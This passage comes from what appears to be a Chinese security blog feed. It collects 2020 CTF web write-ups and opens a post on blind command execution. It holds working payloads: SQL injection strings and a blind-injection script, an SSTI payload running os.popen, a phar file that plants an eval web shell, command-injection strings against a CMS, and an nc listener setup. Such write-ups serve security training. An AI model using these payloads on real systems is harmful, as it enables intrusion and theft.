class="line">and_operation()</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">    $upload = <span class="string">'upload/'</span>.md5(<span class="string">"shuyu"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($upload);</span><br><span class="line">    file_put_contents($upload.<span class="string">'/index.html'</span>, <span class="string">''</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $allow_type=<span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"bmp"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>);</span><br><span class="line">        $fileext = substr(strrchr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>], <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'upload error'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            $filename=addslashes($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">            $sql=<span class="string">"insert into img (filename) values ('$filename')"</span>;</span><br><span class="line">            $conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">            $sql=<span class="string">"select id from img where filename='$filename'"</span>;</span><br><span class="line">            $result=$conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                    $id=$row[<span class="string">"id"</span>];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$upload.<span class="string">'/'</span>.$filename);</span><br><span class="line">            header(<span class="string">"Location: index.php?id=$id"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $id=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">        $sql=<span class="string">"select filename from img where id=$id"</span>;</span><br><span class="line">        $result=$conn-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                $filename=$row[<span class="string">"filename"</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        $img=$upload.<span class="string">'/'</span>.$filename;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt; img src='$img'/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit1'</span>]))&#123;</span><br><span class="line">        $allow_type=<span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"bmp"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>);</span><br><span class="line">        $fileext = substr(strrchr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>], <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'upload error'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=addslashes($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$upload.<span class="string">'/'</span>.$filename);</span><br><span class="line">            @exec(<span class="string">"cd /tmp&amp;&amp;python3 /tar.py "</span>.escapeshellarg(<span class="string">'/var/www/html/'</span>.$upload.<span class="string">'/'</span>.$filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$conn=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"shuyu"</span>); </span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error($conn))</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"     MySQL ʧ  : "</span> . mysqli_connect_error(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  $value= str_ireplace(<span class="string">'\''</span>,<span class="string">''</span>,$value);</span><br><span class="line">  $value= str_ireplace(<span class="string">'"'</span>,<span class="string">''</span>,$value);</span><br><span class="line">     $value= str_ireplace(<span class="string">'union'</span>,<span class="string">''</span>,$value);</span><br><span class="line">     $value= str_ireplace(<span class="string">'select'</span>,<span class="string">''</span>,$value);</span><br><span class="line">     $value= str_ireplace(<span class="string">'from'</span>,<span class="string">''</span>,$value);</span><br><span class="line">     $value= str_ireplace(<span class="string">'or'</span>,<span class="string">''</span>,$value);</span><br><span class="line">  $_GET[$key] =$value;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"bingo : &lt;b&gt;$flag&lt;/b&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=240610708&amp;password=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO&amp;submit=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure><p><a href="https://ctftime.org/writeup/11325" target="_blank" rel="noopener">https://ctftime.org/writeup/11325</a></p><h1 id="某次比赛"><a href="#某次比赛" class="headerlink" title="某次比赛"></a>某次比赛</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="../../images/game/2020/daida/1.png" alt=""></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'+(select+updatexml(1,substr((select secert from secert),1,40),1))+'</span></span><br></pre></td></tr></table></figure><p><img src="../../images/game/2020/daida/2.png" alt=""><br><img src="../../images/game/2020/daida/3.png" alt=""></p><h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><p>做题的时候尽量用 burpsuite 发送</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=a||grep%09-r%09fla%09/</span><br></pre></td></tr></table></figure><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">(str)</span>:</span> </span><br><span class="line">    black_list = [<span class="string">'flag'</span>,<span class="string">'os'</span>,<span class="string">'system'</span>,<span class="string">'popen'</span>,<span class="string">'import'</span>,<span class="string">'eval'</span>,<span class="string">'chr'</span>,<span class="string">'request'</span>, <span class="string">'subprocess'</span>,<span class="string">'commands'</span>,<span class="string">'socket'</span>,<span class="string">'hex'</span>,<span class="string">'base64'</span>,<span class="string">'*'</span>,<span class="string">'?'</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> str.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Damn you hacker! You will never"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessNum</span><span class="params">(num,name)</span>:</span></span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">1000000000.0</span></span><br><span class="line">    mid=(l+r)/<span class="number">2.0</span></span><br><span class="line">    ret=<span class="string">"</span></span><br><span class="line"><span class="string">    cnt=0</span></span><br><span class="line"><span class="string">    while not abs(mid-num)&lt;0.00001:</span></span><br><span class="line"><span class="string">        cnt=cnt+1</span></span><br><span class="line"><span class="string">        mid=(l+r)/2.0</span></span><br><span class="line"><span class="string">        if mid&gt;num:</span></span><br><span class="line"><span class="string">            r=mid</span></span><br><span class="line"><span class="string">            ret+="</span>&#123;<span class="number">0</span>&#125;:&#123;<span class="number">1</span>&#125; <span class="keyword">is</span> too large&lt;br/&gt;<span class="string">".format(cnt,mid)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            l=mid</span></span><br><span class="line"><span class="string">            ret+="</span>&#123;<span class="number">0</span>&#125;:&#123;<span class="number">1</span>&#125; <span class="keyword">is</span> too small&lt;br/&gt;<span class="string">".format(cnt,mid)</span></span><br><span class="line"><span class="string">        if cnt &gt; 50:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if cnt &lt; 50:</span></span><br><span class="line"><span class="string">        ret+="</span>&#123;<span class="number">0</span>&#125;:&#123;<span class="number">1</span>&#125; <span class="keyword">is</span> close enough&lt;br/&gt;I win<span class="string">".format(cnt,mid)</span></span><br><span class="line"><span class="string">    else :</span></span><br><span class="line"><span class="string">        ret+="</span>Wow! &#123;<span class="number">0</span>&#125; win.<span class="string">".format(safe(name))</span></span><br><span class="line"><span class="string">    return ret</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route('/',methods=['POST','GET'])</span></span><br><span class="line"><span class="string">def Hello():</span></span><br><span class="line"><span class="string">    if request.method == "</span>POST<span class="string">":</span></span><br><span class="line"><span class="string">        user = request.form['name']</span></span><br><span class="line"><span class="string">        resp = make_response(render_template("</span>guess.html<span class="string">",name=user))</span></span><br><span class="line"><span class="string">        resp.set_cookie('user',base64.urlsafe_b64encode(user),max_age=3600)</span></span><br><span class="line"><span class="string">        return resp</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        user=request.cookies.get('user')</span></span><br><span class="line"><span class="string">        if user == None:</span></span><br><span class="line"><span class="string">            return render_template("</span>index.html<span class="string">")</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            user=user.encode('utf-8')</span></span><br><span class="line"><span class="string">            return render_template("</span>guess.html<span class="string">",name=base64.urlsafe_b64decode(user))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route('/guess',methods=['POST'])</span></span><br><span class="line"><span class="string">def Guess():</span></span><br><span class="line"><span class="string">    user=request.cookies.get('user')</span></span><br><span class="line"><span class="string">    if user==None:</span></span><br><span class="line"><span class="string">        return redirect(url_for("</span>Hello<span class="string">"))</span></span><br><span class="line"><span class="string">    user=user.encode('utf-8')</span></span><br><span class="line"><span class="string">    name = base64.urlsafe_b64decode(user)</span></span><br><span class="line"><span class="string">    num = float(request.form['num'])</span></span><br><span class="line"><span class="string">    if(num&lt;0):</span></span><br><span class="line"><span class="string">        return "</span>Too Small<span class="string">"</span></span><br><span class="line"><span class="string">    elif num&gt;1000000000.0:</span></span><br><span class="line"><span class="string">        return "</span>Too Large<span class="string">"</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return render_template_string(guessNum(num,name))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.errorhandler(404)</span></span><br><span class="line"><span class="string">def miss(e):</span></span><br><span class="line">    return "What are you looking for?!!".getattr(app, '__name__', getattr(app.__class__, '__name__')), 404</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f_handler=open(<span class="string">'/var/log/app.log'</span>, <span class="string">'w'</span>)</span><br><span class="line">    sys.stderr=f_handler</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>通过测试这里过滤了os，popen，system，flag等关键字符，可以通过拼接绕过，最后的payload user为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>][<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'cat /super_secret_fl'</span>+<span class="string">'ag.txt'</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64编码，num为nan </p><h1 id="嘶吼ctf"><a href="#嘶吼ctf" class="headerlink" title="嘶吼ctf"></a>嘶吼ctf</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!-- /?url= --&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'url'</span>]) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($curl, CURLOPT_TIMEOUT, <span class="number">500</span>);</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line"></span><br><span class="line">$res = curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssrf 两次url编码读取。因使用了curl函数，curl会在处理请求的时候再进行一次urldecode。故构造payload时二次urlencode即可绕过<br><img src="../../images/game/2020/roarctf/1.png" alt=""></p><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>过滤了挺多的，mysql8版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table information_schema.tables <span class="built_in">limit</span> 330,1;</span><br></pre></td></tr></table></figure><p><img src="../../images/game/2020/roarctf/1.jpg" alt=""><br>表达式来逐位爆破<br><img src="../../images/game/2020/roarctf/2.jpg" alt=""><br>由此构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"'or('def','ctf','&#123;&#125;&#123;&#125;',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)&lt;(table/**/information_schema.tables/**/limit/**/323,1)#"</span>.format(flag,table[j])</span><br></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tables</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://139.129.98.9:30003/login.php"</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    table = string.digits+string.ascii_uppercase+string.ascii_lowercase</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(table)):</span><br><span class="line">            payload = <span class="string">"'or('def','ctf','&#123;&#125;&#123;&#125;',4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'','','')&lt;(table/**/information_schema.tables/**/limit/**/323,1)#"</span>.format(flag,table[j])</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            post = &#123;</span><br><span class="line">                <span class="string">"username"</span>:payload,</span><br><span class="line">                <span class="string">"password"</span>:<span class="string">"123"</span></span><br><span class="line">            &#125;</span><br><span class="line">            text = requests.post(url=url,data=post).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"username error!"</span> <span class="keyword">in</span> text:</span><br><span class="line">                flag += table[j<span class="number">-1</span>]</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    new_flag =flag[:<span class="number">-1</span>] + table[table.find(flag[<span class="number">-1</span>])+<span class="number">1</span>]</span><br><span class="line">    print(new_flag)</span><br><span class="line">tables()</span><br></pre></td></tr></table></figure><h1 id="纵横杯"><a href="#纵横杯" class="headerlink" title="纵横杯"></a>纵横杯</h1><h2 id="马赛克"><a href="#马赛克" class="headerlink" title="马赛克"></a>马赛克</h2><p><a href="https://github.com/beurtschipper/Depix" target="_blank" rel="noopener">https://github.com/beurtschipper/Depix</a>  </p><h2 id="hello-php"><a href="#hello-php" class="headerlink" title="hello_php"></a>hello_php</h2><p>从配置文件得知 后台登录账户密码 admin admin888<br>上传aaa.phar文件，修改title,并写入一句话   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title= <span class="string">'123\';echo 123;@eval($_POST[1]);?&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"aaa.phar"</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> Config;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"a.txt"</span>, <span class="string">"a"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>index.php中 ?img=phar://文件名路径 触发<br><img src="../../images/game/2020/zonghengbei/1.jpg" alt=""></p><p>disable_function 很多函数，file_get_contents()没有被禁止，注意记得要打印出来<br>1=var_dump(file_get_contents (‘/flag’));</p><h2 id="大家一起来审代码"><a href="#大家一起来审代码" class="headerlink" title="大家一起来审代码"></a>大家一起来审代码</h2><p>海洋cms10.1v<br>该版本相关漏洞： <a href="https://www.freebuf.com/vuls/241106.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/241106.html</a><br>出题人对漏洞点进行了防护，可以找其他漏洞点，或绕过防护   </p><p>如 admin_ping.php 文件没有对传入的参数做任何防护，可直接传入如下值<br>利用一：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";system("</span>cat /flag<span class="string">");eval(<span class="variable">$_GET</span>['1']);/*</span></span><br></pre></td></tr></table></figure><p><img src="../../images/game/2020/zonghengbei/2.jpg" alt=""><br>利用二：<br>取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">"cat /flag"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">231<span class="string">");<span class="variable">$z</span>='%8C%86%8C%8B%9A%92';<span class="variable">$p</span>=~'%9C%9E%8B%DF%D0%99%93%9E%98';<span class="variable">$z</span>=~<span class="variable">$z</span>;<span class="variable">$z</span>(<span class="variable">$p</span>);//</span></span><br></pre></td></tr></table></figure><h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><p> <a href="https://github.com/yzmcms/yzmcms/issues/53" target="_blank" rel="noopener">https://github.com/yzmcms/yzmcms/issues/53</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020的一些题目集合&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>无回显命令执行</title>
    <link href="https://blog.cfyqy.com/article/e8fed0e.html"/>
    <id>https://blog.cfyqy.com/article/e8fed0e.html</id>
    <published>2020-09-10T08:51:00.000Z</published>
    <updated>2020-09-10T14:22:06.542Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。    </p><a id="more"></a><h1 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h1><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">shell_exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls | sleep 3</span><br></pre></td></tr></table></figure><p>通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行,延迟3秒</p><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>1.在公网服务器监听监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>2.向目标服务器发起http请求，执行curl命令</p><figure class="highlight 